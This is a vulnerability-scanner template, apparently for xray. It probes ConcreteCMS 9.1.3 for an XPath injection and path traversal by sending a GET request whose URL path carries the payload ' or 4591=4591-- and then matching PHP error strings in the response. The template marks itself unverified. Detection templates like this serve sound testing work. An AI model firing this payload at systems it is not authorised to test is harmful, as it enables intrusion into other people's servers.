expression: r0()
id: concretecms-9-1-3-xpath-injection
info:
  author: nu11secur1ty
  description: "URL \u8DEF\u5F84\u6587\u4EF6\u59393\u4F3C\u4E4E\u5BB9\u6613\u53D7\u5230\
    \ XPath \u6CE8\u5165\u653B\u51FB\u3002\u6D4B\u8BD5payload 50539478' or 4591=4591--\u63D0\
    \u4EA4\u5230URL\u8DEF\u5F84\u6587\u4EF6\u59393\uFF0C\u8FD4\u56DEXPath\u9519\u8BEF\
    \u4FE1\u606F\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u6B64\u6F0F\u6D1E\
    \u5411\u7CFB\u7EDF\u53D1\u51FA\u5927\u91CF\u8BF7\u6C42\uFF0C\u76F4\u5230\u4ED6\
    \u6536\u5230\u8BE5\u7CFB\u7EDF\u6240\u6709\u5185\u5BB9\u7684\u5B9E\u9645\u8DEF\
    \u5F84\uFF0C\u8FD9\u4E9B\u5185\u5BB9\u5B58\u50A8\u5728\u67D0\u4E9B\u5185\u90E8\
    \u6216\u5916\u90E8\u670D\u52A1\u5668\u4E0A\u3002"
  name: "concretecms-9.1.3 - XPath\u6CE8\u5165 - \u6587\u4EF6\u8DEF\u5F84\u904D\u5386"
  reference:
  - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/concretecms.org/2022/concretecms-9.1.3
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 500 && response.body.bcontains(b'include():') &&
      response.body.bcontains(b'Failed opening') && response.body.bcontains(b'ErrorException:')
    request:
      method: GET
      path: /index.php/ccm50539478'%20or%204591%3d4591--%20/assets/localization/moment/js
